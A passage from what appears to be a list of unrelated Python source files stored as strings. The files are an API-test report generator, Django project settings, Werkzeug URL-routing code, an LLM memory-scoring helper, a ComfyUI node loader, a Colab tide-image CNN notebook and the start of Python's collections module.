result in results %}\n                <tr>\n                    <td>{{ result.route }}</td>\n                    <td>{{ result.method }}</td>\n                    <td>{{ result.status_code or \"N/A\" }}</td>\n                    <td>{{ result.response_time or \"N/A\" }}</td>\n                    <td style=\"max-width: 300px; word-wrap: break-word;\">{{ result.response or \"N/A\" }}</td>\n                    <td>{{ result.error or \"N/A\" }}</td>\n                </tr>\n                {% endfor %}\n            </tbody>\n        </table>\n    </body>\n    </html>\n    \"\"\"\n\n    template = Template(html_template)\n    rendered_html = template.render(results=results)\n\n    with open(output_file, \"w\", encoding=\"utf-8\") as file:\n        file.write(rendered_html)\n    print(f\"Relat\u00f3rio HTML gerado com sucesso em '{output_file}'.\")\n\ndef generate_report(results):\n    reports_dir = ensure_reports_directory()\n\n    csv_file = os.path.join(reports_dir, \"api_test_report.csv\")\n    html_file = os.path.join(reports_dir, \"api_test_report.html\")\n    json_file = os.path.join(reports_dir, \"raw_responses.json\")\n\n    df = pd.DataFrame(results)\n    df.to_csv(csv_file, index=False, escapechar=\"\\\\\")\n    print(f\"Relat\u00f3rio CSV gerado com sucesso em '{csv_file}'.\")\n\n    save_json_file(json_file, results)\n    generate_html_report(results, html_file)\n\ndef main(results):\n    generate_report(results)\n\nif __name__ == \"__main__\":\n    sample_results = [\n        {\n            \"route\": \"/api/v1/users\",\n            \"method\": \"GET\",\n            \"status_code\": 200,\n            \"response_time\": 0.123,\n            \"response\": \"{\\\"users\\\": [{\\\"id\\\": 1, \\\"name\\\": \\\"Alice\\\"}]}\",\n            \"error\": None\n        },\n        {\n            \"route\": \"/api/v1/users\",\n            \"method\": \"POST\",\n            \"status_code\": 201,\n            \"response_time\": 0.456,\n            \"response\": \"{\\\"id\\\": 2, \\\"name\\\": \\\"Bob\\\"}\",\n            \"error\": None\n        },\n        {\n            \"route\": \"/api/v1/invalid\",\n            \"method\": \"GET\",\n            \"status_code\": 404,\n            \"response_time\": 0.321,\n            \"response\": \"Not Found\",\n            \"error\": None\n        }\n    ]\n    main(sample_results)\n",
    "# -*- encoding: utf-8 -*-\n\"\"\"\nCopyright (c) 2019 - present AppSeed.us\n\"\"\"\n\nimport os, random, string\nfrom pathlib import Path\nfrom dotenv import load_dotenv\n\nfrom helpers import *\n\nload_dotenv()  # LOAD variables from .env\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/4.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = os.environ.get(\"SECRET_KEY\")\nif not SECRET_KEY:\n    SECRET_KEY = \"TODO_SET_SECRET_KEY\"\n\nDEBUG = os.environ.get(\"DEBUG\", True)\n\nAPP_DOMAIN = os.getenv(\"APP_DOMAIN\", \"localhost\")\n\n# HOSTs List\nALLOWED_HOSTS = [\"127.0.0.1\", \"localhost\", APP_DOMAIN, \".deploypro.dev\"]\n\n# Add here your deployment HOSTS\nCSRF_TRUSTED_ORIGINS = [\n    \"http://localhost:8000\",\n    \"http://localhost:5085\",\n    \"http://127.0.0.1:8000\",\n    \"http://127.0.0.1:5085\",\n    f\"http://{APP_DOMAIN}\",\n    f\"https://{APP_DOMAIN}\",\n    \"https://*.deploypro.dev\",\n]\n\nRENDER_EXTERNAL_HOSTNAME = os.environ.get(\"RENDER_EXTERNAL_HOSTNAME\")\nif RENDER_EXTERNAL_HOSTNAME:\n    ALLOWED_HOSTS.append(RENDER_EXTERNAL_HOSTNAME)\n\n# Application definition\n\nINSTALLED_APPS = [\n    \"admin_material.apps.AdminMaterialDashboardConfig\",\n    \"django.contrib.admin\",\n    \"django.contrib.auth\",\n    \"django.contrib.contenttypes\",\n    \"django.contrib.sessions\",\n    \"django.contrib.messages\",\n    \"django.contrib.staticfiles\",\n    \"home\",\n    \"django_dyn_api\",\n    \"rest_framework\",\n    \"rest_framework.authtoken\",\n]\n\n\nMIDDLEWARE = [\n    \"django.middleware.security.SecurityMiddleware\",\n    \"whitenoise.middleware.WhiteNoiseMiddleware\",\n    \"django.contrib.sessions.middleware.SessionMiddleware\",\n    \"django.middleware.common.CommonMiddleware\",\n    \"django.middleware.csrf.CsrfViewMiddleware\",\n    \"django.contrib.auth.middleware.AuthenticationMiddleware\",\n    \"django.contrib.messages.middleware.MessageMiddleware\",\n    \"django.middleware.clickjacking.XFrameOptionsMiddleware\",\n]\n\nROOT_URLCONF = \"core.urls\"\n\nHOME_TEMPLATES = os.path.join(BASE_DIR, \"templates\")\n\nTEMPLATES = [\n    {\n        \"BACKEND\": \"django.template.backends.django.DjangoTemplates\",\n        \"DIRS\": [HOME_TEMPLATES],\n        \"APP_DIRS\": True,\n        \"OPTIONS\": {\n            \"context_processors\": [\n                \"django.template.context_processors.debug\",\n                \"django.template.context_processors.request\",\n                \"django.contrib.auth.context_processors.auth\",\n                \"django.contrib.messages.context_processors.messages\",\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = \"core.wsgi.application\"\n\n\n# Database\n# https://docs.djangoproject.com/en/4.1/ref/settings/#databases\n\nDB_ENGINE = os.getenv(\"DB_ENGINE\", None)\nDB_USERNAME = os.getenv(\"DB_USERNAME\", None)\nDB_PASS = os.getenv(\"DB_PASS\", None)\nDB_HOST = os.getenv(\"DB_HOST\", None)\nDB_PORT = os.getenv(\"DB_PORT\", None)\nDB_NAME = os.getenv(\"DB_NAME\", None)\n\nif DB_ENGINE and DB_NAME and DB_USERNAME:\n    DATABASES = {\n        \"default\": {\n            \"ENGINE\": \"django.db.backends.\" + DB_ENGINE,\n            \"NAME\": DB_NAME,\n            \"USER\": DB_USERNAME,\n            \"PASSWORD\": DB_PASS,\n            \"HOST\": DB_HOST,\n            \"PORT\": DB_PORT,\n        },\n    }\nelse:\n    DATABASES = {\n        \"default\": {\n            \"ENGINE\": \"django.db.backends.sqlite3\",\n            \"NAME\": \"db.sqlite3\",\n        }\n    }\n\n# Password validation\n# https://docs.djangoproject.com/en/4.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.UserAttributeSimilarityValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.MinimumLengthValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.CommonPasswordValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.NumericPasswordValidator\",\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/4.1/topics/i18n/\n\nLANGUAGE_CODE = \"en-us\"\n\nTIME_ZONE = \"UTC\"\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/4.1/howto/static-files/\n\nSTATIC_URL = \"/static/\"\nSTATIC_ROOT = os.path.join(BASE_DIR, \"staticfiles\")\n\nSTATICFILES_DIRS = (os.path.join(BASE_DIR, \"static\"),)\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/4.1/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = \"django.db.models.BigAutoField\"\nLOGIN_REDIRECT_URL = \"/\"\n\nEMAIL_BACKEND = \"django.core.mail.backends.console.EmailBackend\"\n\n# __API_GENERATOR__\nDYNAMIC_API = {\n    #__RULES__\n    'Company' : 'home.models.Company',\n\n    #__RULES__END\n}\n\nREST_FRAMEWORK = {\n    'DEFAULT_AUTHENTICATION_CLASSES': [\n        'rest_framework.authentication.SessionAuthentication',\n        'rest_framework.authentication.TokenAuthentication',\n    ],\n}\n\n# __API_GENERATOR__END\n\n# __CELERY__\n\n# __OAUTH_GITHU",
    "from __future__ import annotations\n\nimport ast\nimport re\nimport typing as t\nfrom dataclasses import dataclass\nfrom string import Template\nfrom types import CodeType\nfrom urllib.parse import quote\n\nfrom ..datastructures import iter_multi_items\nfrom ..urls import _urlencode\nfrom .converters import ValidationError\n\nif t.TYPE_CHECKING:\n    from .converters import BaseConverter\n    from .map import Map\n\n\nclass Weighting(t.NamedTuple):\n    number_static_weights: int\n    static_weights: list[tuple[int, int]]\n    number_argument_weights: int\n    argument_weights: list[int]\n\n\n@dataclass\nclass RulePart:\n    \"\"\"A part of a rule.\n\n    Rules can be represented by parts as delimited by `/` with\n    instances of this class representing those parts. The *content* is\n    either the raw content if *static* or a regex string to match\n    against. The *weight* can be used to order parts when matching.\n\n    \"\"\"\n\n    content: str\n    final: bool\n    static: bool\n    suffixed: bool\n    weight: Weighting\n\n\n_part_re = re.compile(\n    r\"\"\"\n    (?:\n        (?P<slash>/)                                 # a slash\n      |\n        (?P<static>[^</]+)                           # static rule data\n      |\n        (?:\n          <\n            (?:\n              (?P<converter>[a-zA-Z_][a-zA-Z0-9_]*)   # converter name\n              (?:\\((?P<arguments>.*?)\\))?             # converter arguments\n              :                                       # variable delimiter\n            )?\n            (?P<variable>[a-zA-Z_][a-zA-Z0-9_]*)      # variable name\n           >\n        )\n    )\n    \"\"\",\n    re.VERBOSE,\n)\n\n_simple_rule_re = re.compile(r\"<([^>]+)>\")\n_converter_args_re = re.compile(\n    r\"\"\"\n    \\s*\n    ((?P<name>\\w+)\\s*=\\s*)?\n    (?P<value>\n        True|False|\n        \\d+.\\d+|\n        \\d+.|\n        \\d+|\n        [\\w\\d_.]+|\n        [urUR]?(?P<stringval>\"[^\"]*?\"|'[^']*')\n    )\\s*,\n    \"\"\",\n    re.VERBOSE,\n)\n\n\n_PYTHON_CONSTANTS = {\"None\": None, \"True\": True, \"False\": False}\n\n\ndef _find(value: str, target: str, pos: int) -> int:\n    \"\"\"Find the *target* in *value* after *pos*.\n\n    Returns the *value* length if *target* isn't found.\n    \"\"\"\n    try:\n        return value.index(target, pos)\n    except ValueError:\n        return len(value)\n\n\ndef _pythonize(value: str) -> None | bool | int | float | str:\n    if value in _PYTHON_CONSTANTS:\n        return _PYTHON_CONSTANTS[value]\n    for convert in int, float:\n        try:\n            return convert(value)\n        except ValueError:\n            pass\n    if value[:1] == value[-1:] and value[0] in \"\\\"'\":\n        value = value[1:-1]\n    return str(value)\n\n\ndef parse_converter_args(argstr: str) -> tuple[tuple[t.Any, ...], dict[str, t.Any]]:\n    argstr += \",\"\n    args = []\n    kwargs = {}\n    position = 0\n\n    for item in _converter_args_re.finditer(argstr):\n        if item.start() != position:\n            raise ValueError(\n                f\"Cannot parse converter argument '{argstr[position:item.start()]}'\"\n            )\n\n        value = item.group(\"stringval\")\n        if value is None:\n            value = item.group(\"value\")\n        value = _pythonize(value)\n        if not item.group(\"name\"):\n            args.append(value)\n        else:\n            name = item.group(\"name\")\n            kwargs[name] = value\n        position = item.end()\n\n    return tuple(args), kwargs\n\n\nclass RuleFactory:\n    \"\"\"As soon as you have more complex URL setups it's a good idea to use rule\n    factories to avoid repetitive tasks.  Some of them are builtin, others can\n    be added by subclassing `RuleFactory` and overriding `get_rules`.\n    \"\"\"\n\n    def get_rules(self, map: Map) -> t.Iterable[Rule]:\n        \"\"\"Subclasses of `RuleFactory` have to override this method and return\n        an iterable of rules.\"\"\"\n        raise NotImplementedError()\n\n\nclass Subdomain(RuleFactory):\n    \"\"\"All URLs provided by this factory have the subdomain set to a\n    specific domain. For example if you want to use the subdomain for\n    the current language this can be a good setup::\n\n        url_map = Map([\n            Rule('/', endpoint='#select_language'),\n            Subdomain('<string(length=2):lang_code>', [\n                Rule('/', endpoint='index'),\n                Rule('/about', endpoint='about'),\n                Rule('/help', endpoint='help')\n            ])\n        ])\n\n    All the rules except for the ``'#select_language'`` endpoint will now\n    listen on a two letter long subdomain that holds the language code\n    for the current request.\n    \"\"\"\n\n    def __init__(self, subdomain: str, rules: t.Iterable[RuleFactory]) -> None:\n        self.subdomain = subdomain\n        self.rules = rules\n\n    def get_rules(self, map: Map) -> t.Iterator[Rule]:\n        for rulefactory in self.rules:\n            for rule in rulefactory.get_rules(map):\n                rule = rule.empty()\n                rule.subdomain = self.subdomain\n                yield rule\n\n\nclass Submount(RuleFactory):\n    \"\"\"Like `Subdomain` but prefixes the URL rule with a given string::\n\n    ",
    "import requests\nimport time\nfrom engines.prompts import get_significance_score_prompt\n\ndef score_significance(memory: str, llm_api_key: str) -> int:\n    \"\"\"\n    Score the significance of a memory on a scale of 1-10.\n    \n    Args:\n        memory (str): The memory to be scored\n        openrouter_api_key (str): API key for OpenRouter\n        your_site_url (str): Your site URL for OpenRouter API\n        your_app_name (str): Your app name for OpenRouter API\n    \n    Returns:\n        int: Significance score (1-10)\n    \"\"\"\n    prompt = get_significance_score_prompt(memory)\n\n    tries = 0\n    max_tries = 5\n    while tries < max_tries:\n        try:\n            response = requests.post(\n                url=\"https://api.hyperbolic.xyz/v1/chat/completions\",\n                headers={\n                    \"Content-Type\": \"application/json\",\n                    \"Authorization\": f\"Bearer {llm_api_key}\",\n                },\n                json={\n                    \"messages\": [\n                        {\n                            \"role\": \"system\",\n        \t                \"content\": prompt\n                        },\n                        {\n                            \"role\": \"user\",\n                            \"content\": \"Respond only with the score you would give for the given memory.\"\n                        }\n                    ],\n                    \"model\": \"meta-llama/Meta-Llama-3.1-70B-Instruct\",\n                    \"temperature\": 1,\n                    \"top_p\": 0.95,\n                    \"top_k\": 40,\n                }\n            )\n\n            if response.status_code == 200:\n                score_str = response.json()['choices'][0]['message']['content'].strip()\n                print(f\"Score generated for memory: {score_str}\")\n                if score_str == \"\":\n                    print(f\"Empty response on attempt {tries + 1}\")\n                    tries += 1\n                    continue\n                \n                try:\n                    # Extract the first number found in the response\n                    # This helps handle cases where the model includes additional text\n                    import re\n                    numbers = re.findall(r'\\d+', score_str)\n                    if numbers:\n                        score = int(numbers[0])\n                        return max(1, min(10, score))  # Ensure the score is between 1 and 10\n                    else:\n                        print(f\"No numerical score found in response: {score_str}\")\n                        tries += 1\n                        continue\n                        \n                except ValueError:\n                    print(f\"Invalid score returned: {score_str}\")\n                    tries += 1\n                    continue\n            else:\n                print(f\"Error on attempt {tries + 1}. Status code: {response.status_code}\")\n                print(f\"Response: {response.text}\")\n                tries += 1\n                \n        except Exception as e:\n            print(f\"Error on attempt {tries + 1}: {str(e)}\")\n            tries += 1 \n            time.sleep(1)  # Add a small delay between retries",
    "\"\"\"\n     \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2557    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n     \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\n     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551   \u2588\u2588\u2551\n\u2588\u2588   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\u2588\u2588\u2551    \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551   \u2588\u2588\u2551\n\u255a\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u255a\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551     \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d   \u2588\u2588\u2551\n \u255a\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d   \u255a\u2550\u2550\u2550\u255d  \u255a\u2550\u255d    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d      \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d    \u255a\u2550\u255d\n\n                       SPOUT support for ComfyUI\n                http://www.github.com/amorano/Jovi_Spout\n\"\"\"\n\n__all__ = [\"NODE_CLASS_MAPPINGS\", \"NODE_DISPLAY_NAME_MAPPINGS\", \"WEB_DIRECTORY\"]\n__author__ = \"Alexander G. Morano\"\n__email__ = \"amorano@gmail.com\"\n\nimport os\nimport sys\nimport json\nimport inspect\nimport importlib\nfrom pathlib import Path\nfrom types import ModuleType\n\nfrom loguru import logger\n\n# ==============================================================================\n# === GLOBAL ===\n# ==============================================================================\n\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}\nWEB_DIRECTORY = \"./web\"\n\nROOT = Path(__file__).resolve().parent\nROOT_COMFY = ROOT.parent.parent\n\nJOV_WEB = ROOT / 'web'\n\nJOV_LOG_LEVEL = os.getenv(\"JOV_LOG_LEVEL\", \"INFO\")\nlogger.configure(handlers=[{\"sink\": sys.stdout, \"level\": JOV_LOG_LEVEL}])\n\nJOV_INTERNAL = os.getenv(\"JOV_INTERNAL\", 'false').strip().lower() in ('true', '1', 't')\n\nJOV_PACKAGE = \"JOV_SPOUT\"\n\n# ==============================================================================\n# === SUPPORT ===\n# ==============================================================================\n\ndef load_module(name: str) -> None|ModuleType:\n    module = inspect.getmodule(inspect.stack()[0][0]).__name__\n    try:\n        route = str(name).replace(\"\\\\\", \"/\")\n        route = route.split(f\"{module}/core/\")[1]\n        route = route.split('.')[0].replace('/', '.')\n    except Exception as e:\n        logger.warning(f\"module failed {name}\")\n        logger.warning(str(e))\n        return\n\n    try:\n        module = f\"{module}.core.{route}\"\n        module = importlib.import_module(module)\n    except Exception as e:\n        logger.warning(f\"module failed {module}\")\n        logger.warning(str(e))\n        return\n\n    return module\n\ndef loader():\n    global NODE_DISPLAY_NAME_MAPPINGS, NODE_CLASS_MAPPINGS\n    NODE_LIST_MAP = {}\n\n    for fname in ROOT.glob('core/**/*.py'):\n        if fname.stem.startswith('_'):\n            continue\n\n        if (module := load_module(fname)) is None:\n            continue\n\n        classes = inspect.getmembers(module, inspect.isclass)\n        for class_name, class_object in classes:\n            if not class_name.endswith('BaseNode') and hasattr(class_object, 'NAME') and hasattr(class_object, 'CATEGORY'):\n                name = f\"{class_object.NAME} ({JOV_PACKAGE})\"\n                NODE_DISPLAY_NAME_MAPPINGS[name] = name\n                NODE_CLASS_MAPPINGS[name] = class_object\n                desc = class_object.DESCRIPTION if hasattr(class_object, 'DESCRIPTION') else name\n                NODE_LIST_MAP[name] = desc.split('.')[0].strip('\\n')\n\n    NODE_CLASS_MAPPINGS = {x[0] : x[1] for x in sorted(NODE_CLASS_MAPPINGS.items(),\n                                                            key=lambda item: getattr(item[1], 'SORT', 0))}\n\n    keys = NODE_CLASS_MAPPINGS.keys()\n    for name in keys:\n        logger.debug(f\"\u2705 {name}\")\n    logger.info(f\"{len(keys)} nodes loaded\")\n\n    # only do the list on local runs...\n    if JOV_INTERNAL:\n        with open(str(ROOT) + \"/node_list.json\", \"w\", encoding=\"utf-8\") as f:\n            json.dump(NODE_LIST_MAP, f, sort_keys=True, indent=4 )\n\n# ==============================================================================\n# === CLASS ===\n# ==============================================================================\n\nclass JOVBaseNode:\n    NOT_IDEMPOTENT = True\n    CATEGORY = f\"{JOV_PACKAGE} \ud83d\udcfa\"\n    RETURN_TYPES = ()\n    FUNCTION = \"run\"\n\n    @classmethod\n    def IS_CHANGED(cls, **kw) -> float:\n        return float('nan')\n\n    @classmethod\n    def VALIDATE_INPUTS(cls, *arg, **kw) -> bool:\n        return True\n\n    @classmethod\n    def INPUT_TYPES(cls, prompt:bool=False, extra_png:bool=False, dynprompt:bool=False) -> dict:\n        data = {\n            \"optional\": {},\n            \"required\": {},\n            \"hidden\": {\n                \"ident\": \"UNIQUE_ID\"\n            }\n        }\n        if prompt:\n            data[\"hidden\"][\"prompt\"] = \"PROMPT\"\n        if extra_png:\n            data[\"hidden\"][\"extra_pnginfo\"] = \"EXTRA_PNGINFO\"\n\n        if dynprompt:\n            data[\"hidden\"][\"dynprompt\"] = \"DYNPROMPT\"\n        return data\n\n# ==============================================================================\n# === BOOTSTRAP ===\n# ==============================================================================\n\nloader()\n",
    "# -*- coding: utf-8 -*-\n\"\"\"CNN_mares.ipynb\n\nAutomatically generated by Colab.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1MzcIS9Qk4z_1loLSZvdpu2wgy_rguWCG\n\n#Instala\u00e7\u00e3o e importa\u00e7\u00e3o de bibliotecas\n\"\"\"\n\nfrom google.colab import drive\ndrive.mount('/content/drive')\n\n# Instala\u00e7\u00e3o\n!pip install pyrsgis\n!pip install gdal\n!pip install keras\n!pip install tensorflow\n!pip install opencv-python\n\nimport os, glob\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n#import gdal\nfrom pyrsgis import raster\nimport tensorflow as tf\nfrom sklearn.model_selection import train_test_split\nfrom keras.preprocessing.image import ImageDataGenerator\n\nfrom keras.utils import to_categorical\nfrom keras import backend as K\nfrom tensorflow.keras.utils import to_categorical\nfrom keras.layers import Dense\nfrom keras.layers import Dropout\nfrom keras.layers import Flatten\nfrom keras.layers import Convolution2D\nfrom keras.layers import MaxPooling2D\nfrom keras.models import Sequential\n\nfrom sklearn.metrics import confusion_matrix\nimport seaborn as sns; sns.set_theme()\nimport cv2\n\n\"\"\"#Par\u00e2metros e campos iniciais\"\"\"\n\n##Parametros iniciais\n\n#Classes e endere\u00e7os das pastas das classes\n#Classe 0 = indeterminado\n#Classe 1 = mar\u00e9 baixa\n#Classe 2 = mar\u00e9 mediana\n#classe 3 = mar\u00e9 alta\n\nimageDirectory_indeterminado = '/content/drive/MyDrive/projeto_mares/mares/indeterminado'\nimageDirectory_mare_baixa = '/content/drive/MyDrive/projeto_mares/mares/mare_baixa'\nimageDirectory_mare_mediana = '/content/drive/MyDrive/projeto_mares/mares/mare_mediana'\nimageDirectory_mare_alta = '/content/drive/MyDrive/projeto_mares/mares/mare_alta'\n\nidClass_indeterminado = 0\nidClass_mare_baixa  = 1\nidClass_mare_mediana = 2\nidClass_mare_alta = 3\n\n#Propor\u00e7\u00e3o de dados de treino teste e valida\u00e7\u00e3o\ntrain_ratio = 0.75\nvalidation_ratio = 0.15\ntest_ratio = 0.15\n\n#Param\u00eatros do Modelo\nbatch_size = 35\nepochs = 100\n\n\"\"\"#\u00c1rea de fun\u00e7\u00f5es\"\"\"\n\n#Fun\u00e7\u00e3o que importa arquivos\ndef importImages(path_images):\n  #Importando arquivos\n  imageDirectory = path_images\n  os.chdir(imageDirectory)\n  dirFiles = os.listdir(imageDirectory)\n  return dirFiles\n\n#FUN\u00c7\u00c3O PARA REDIMENSIONAR AS IMAGENS (PADRONIZAR)\ndef resize_image(image, target_size):\n    return cv2.resize(image, target_size)\n\n\n#Fun\u00e7\u00e3o de Ajuste dos tipos e convers\u00e3o de imagens para numpy arrays\ndef recover_data(path_images,idClass, target_size):\n\n  diretoryFiles = importImages(path_images)\n\n  arrList = []\n  classList = []\n  for n in diretoryFiles:\n    classId = idClass\n    ds, tempArr = raster.read(n)\n    # print(tempArr)\n    # print(tempArr.shape)\n    # print(type(tempArr))\n    # print(ds)\n    # print('----------')\n    tempArrNewDim = np.moveaxis(tempArr, 0, -1).copy() #Ajusta dimens\u00f5es para (X,Y,Bandas)\n    resized_image = resize_image(tempArrNewDim, target_size)\n    arrList.append(resized_image)\n    classList.append(classId)\n\n  X = np.array(arrList).copy()\n  y = np.array(classList).copy()\n  # print(arrListImgNumPy)\n  # print(classListNumPy)\n\n  return X , y\n\n\"\"\"#Integra\u00e7\u00e3o dos dados\"\"\"\n\n#Integrando dados e formando o Dataset com variaveis de entrada X, e rotulos y\n\nX_0, y_0 = recover_data(imageDirectory_indeterminado,idClass_indeterminado, target_size=(450, 450))\nX_1, y_1 = recover_data(imageDirectory_mare_baixa,idClass_mare_baixa, target_size=(450, 450))\nX_2, y_2 = recover_data(imageDirectory_mare_mediana,idClass_mare_mediana, target_size=(450, 450))\nX_3, y_3 = recover_data(imageDirectory_mare_alta,idClass_mare_alta, target_size=(450, 450))\n\nX = np.concatenate((X_0, X_1, X_2, X_3)).copy()\ny = np.concatenate((y_0, y_1, y_2, y_3)).copy()\n\n# print(X[10].shape)\n\n# print('Quantidade total de amostras:', y.shape)\n# print(y)\n\n#Visualiza\u00e7\u00e3o da quantidade de dados por classe\nclasses_instances_amount = np.array(np.unique(y,return_counts=True))[1]\nprint(classes_instances_amount)\n\n# Make a random dataset:\nbars = ('indeterminado', 'mar\u00e9_baixa', 'mar\u00e9_mediana', 'mar\u00e9_alta')\ny_pos = np.arange(len(bars))\n\n# Create bars\nplt.bar(y_pos, classes_instances_amount)\n# Create names on the x-axis\nplt.xticks(y_pos, bars)\n# Show graphic\nplt.title('Quantidade de amostras por classe.')\nplt.show()\n\n#Coletado parametros gerais\nshape_img = X[0].shape\ninput_size_firstSide = shape_img[0]\ninput_size_secondSide = shape_img[1]\ninput_size_bands = shape_img[2]\namount_idclass = len(np.unique(y))\n\n# print('Tamanho da entrada do primeiro lado (eixo Y da img)',input_size_firstSide)\n# print('Tamanho da entrada do segundo lado (eixo X da img)',input_size_secondSide)\n# print('Quantidade de bandas/cannals da img', input_size_bands)\n# print('Quantidade dos ids de classes',amount_idclass)\n# print('--------\\n')\n# print('Exibindo a primeira imagem (ou outra qualquer basntando alterar o indice de X).')\n#Exibindo uma imagem.\nimg = X[5]\n#print(img.shape)\nplt.imshow(img);\n\n\"\"\"#Pr\u00e9-Processamento\n\n##Normaliza\u00e7\u00e3o dos dados e divis\u00e3o em dados de treino, valida\u00e7\u00e3o e teste\n\"\"\"\n\n#Normalizando os valores de 0-255 to 0.0-1.0\n\nX = X.astype('float32')#X.astype('float1",
    "'''This module implements specialized container datatypes providing\nalternatives to Python's general purpose built-in containers, dict,\nlist, set, and tuple.\n\n* namedtuple   factory function for creating tuple subclasses with named fields\n* deque        list-like container with fast appends and pops on either end\n* ChainMap     dict-like class for creating a single view of multiple mappings\n* Counter      dict subclass for counting hashable objects\n* OrderedDict  dict subclass that remembers the order entries were added\n* defaultdict  dict subclass that calls a factory function to supply missing values\n* UserDict     wrapper around dictionary objects for easier dict subclassing\n* UserList     wrapper around list objects for easier list subclassing\n* UserString   wrapper around string objects for easier string subclassing\n\n'''\n\n__all__ = [\n    'ChainMap',\n    'Counter',\n    'OrderedDict',\n    'UserDict',\n    'UserList',\n    'UserString',\n    'defaultdict',\n    'deque',\n    'namedtuple',\n]\n\nimport _collections_abc\nimport sys as _sys\n\nfrom itertools import chain as _chain\nfrom itertools import repeat as _repeat\nfrom itertools import starmap as _starmap\nfrom keyword import iskeyword as _iskeyword\nfrom operator import eq as _eq\nfrom operator import itemgetter as _itemgetter\nfrom reprlib import recursive_repr as _recursive_repr\nfrom _weakref import proxy as _proxy\n\ntry:\n    from _collections import deque\nexcept ImportError:\n    pass\nelse:\n    _collections_abc.MutableSequence.register(deque)\n\ntry:\n    from _collections import _deque_iterator\nexcept ImportError:\n    pass\n\ntry:\n    from _collections import defaultdict\nexcept ImportError:\n    pass\n\n\n################################################################################\n### OrderedDict\n################################################################################\n\nclass _OrderedDictKeysView(_collections_abc.KeysView):\n\n    def __reversed__(self):\n        yield from reversed(self._mapping)\n\nclass _OrderedDictItemsView(_collections_abc.ItemsView):\n\n    def __reversed__(self):\n        for key in reversed(self._mapping):\n            yield (key, self._mapping[key])\n\nclass _OrderedDictValuesView(_collections_abc.ValuesView):\n\n    def __reversed__(self):\n        for key in reversed(self._mapping):\n            yield self._mapping[key]\n\nclass _Link(object):\n    __slots__ = 'prev', 'next', 'key', '__weakref__'\n\nclass OrderedDict(dict):\n    'Dictionary that remembers insertion order'\n    # An inherited dict maps keys to values.\n    # The inherited dict provides __getitem__, __len__, __contains__, and get.\n    # The remaining methods are order-aware.\n    # Big-O running times for all methods are the same as regular dictionaries.\n\n    # The internal self.__map dict maps keys to links in a doubly linked list.\n    # The circular doubly linked list starts and ends with a sentinel element.\n    # The sentinel element never gets deleted (this simplifies the algorithm).\n    # The sentinel is in self.__hardroot with a weakref proxy in self.__root.\n    # The prev links are weakref proxies (to prevent circular references).\n    # Individual links are kept alive by the hard reference in self.__map.\n    # Those hard references disappear when a key is deleted from an OrderedDict.\n\n    def __new__(cls, /, *args, **kwds):\n        \"Create the ordered dict object and set up the underlying structures.\"\n        self = dict.__new__(cls)\n        self.__hardroot = _Link()\n        self.__root = root = _proxy(self.__hardroot)\n        root.prev = root.next = root\n        self.__map = {}\n        return self\n\n    def __init__(self, other=(), /, **kwds):\n        '''Initialize an ordered dictionary.  The signature is the same as\n        regular dictionaries.  Keyword argument order is preserved.\n        '''\n        self.__update(other, **kwds)\n\n    def __setitem__(self, key, value,\n                    